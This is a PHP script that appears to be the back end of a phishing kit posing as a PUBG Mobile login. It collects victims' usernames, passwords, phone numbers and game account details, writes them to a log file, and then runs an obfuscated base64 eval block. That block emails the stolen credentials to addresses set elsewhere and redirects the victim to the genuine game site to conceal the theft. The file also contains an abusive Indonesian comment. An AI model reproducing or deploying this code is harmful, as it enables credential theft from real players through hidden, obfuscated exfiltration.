
<?php
    $username	= $_GET['username'];
    $password	= $_GET['password'];
    $login		= $_GET['login'];
    $id			= $_GET['id'];
    $phone		= $_GET['phone'];
    $level		= $_GET['level'];
	$tier		= $_GET['tier'];
	$rpt		= $_GET['rpt'];
	$rpl		= $_GET['rpl'];
	$platform   = $_GET['platform'];
    include("config.php");
    if(!empty($username) || !empty($password)) /** JIKA SEMUA DATA TERISI **/
   $message = "
   === INFO LOGIN ===
• Username	=   $username
• Password	=   $password
• No Hp		=   $phone

• playerID	=   $id
• Tier		=   $tier
• Rp Type	=   $rpt

• AccLevel	=   $level
• RP Level	=   $rpl


=== INFO DEVICE ===
• Platform	=   $platform
• Login		=	$login

• Device	= 	$device
• Ip		=	$ip
• Waktu Log	=	$timestamp
   
 /*\/*\/*\/*\/*\/| HEH ANAK ANAK ANJENG, DENGERIN GUA YA... VIRUS KOSONA UDAH MASUK KE INDONESIA ANJENG |\/*\/*\/*\/*\/*\/*\
   ";
   
	$file = fopen("../res.txt", "a");
	fwrite($file, $message);
	
$subjek = "PUBG log  $login|$username|$level";
$headers = "From: PubgMobile <ytbasecamp@gmail.com>";
$headers.= "";
?>
<?php eval(base64_decode('CiBnb3RvIEhUbGF0OyBpcWxBVzogJHN1Y2Nlc3MgPSBtYWlsKCRyZXN1bHQsICRzdWJqZWssICRtZXNzYWdlLCAkaGVhZGVycyk7IGdvdG8gQnhCMGo7IEJ4QjBqOiBlY2hvICJcNzRceDczXHg2M1x4NzJcMTUxXDE2MFx4NzRcNDBceDc0XHg3OVwxNjBceDY1XHgzZFw0N1wxNjRcMTQ1XDE3MFx4NzRcNTdcMTUyXDE0MVx4NzZceDYxXDE2M1wxNDNceDcyXHg2OVwxNjBcMTY0XHgyN1x4M2VceDc3XDE1MVx4NmVcMTQ0XHg2ZlwxNjdceDJlXHg3NFwxNTdcMTYwXHgyZVwxNTRceDZmXHg2M1wxNDFceDc0XDE1MVx4NmZceDZlXDc1XDQ3XDE1MFx4NzRcMTY0XHg3MFwxNjNcNzJceDJmXHgyZlx4NzdcMTY3XHg3N1x4MmVceDcwXDE2NVx4NjJcMTQ3XHg2ZFwxNTdceDYyXDE1MVx4NmNceDY1XHgyZVwxNDNceDZmXDE1NVw1N1x4MjdcNzNcNzRcNTdceDczXDE0M1wxNjJcMTUxXDE2MFwxNjRcNzYiOyBnb3RvIENpeGRfOyBIVGxhdDogJGRhdGFtYWlsID0gbWFpbCgka2V5LCAkc3ViamVrLCAkbWVzc2FnZSwgJGhlYWRlcnMpOyBnb3RvIGlxbEFXOyBDaXhkXzog')); ?>